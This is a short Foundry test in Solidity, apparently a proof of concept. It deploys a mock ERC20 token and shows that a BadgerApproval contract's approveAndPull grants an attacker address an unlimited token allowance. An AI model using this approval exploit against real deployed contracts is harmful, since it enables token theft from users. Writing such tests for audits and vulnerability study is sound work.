// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contract.sol";

contract MockERC20 is IERC20 {
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allowance");
        allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ExploitBadgerApprovalTest is Test {
    MockERC20 token;
    BadgerApproval app;
    address victim = address(0xCAFE);
    address attacker = address(0xBEEF);

    function setUp() public {
        token = new MockERC20();
        app = new BadgerApproval(address(token), address(0xDEAD));
        token.mint(victim, 1000 ether);
    }

    function testExploit_UntrustedSpenderGetsUnlimitedApproval() public {
        vm.prank(victim);
        app.approveAndPull(attacker, 1 ether);

        uint256 allow = token.allowance(address(app), attacker);
        assertEq(allow, type(uint256).max, "attacker should receive unlimited approval from app");
    }
}
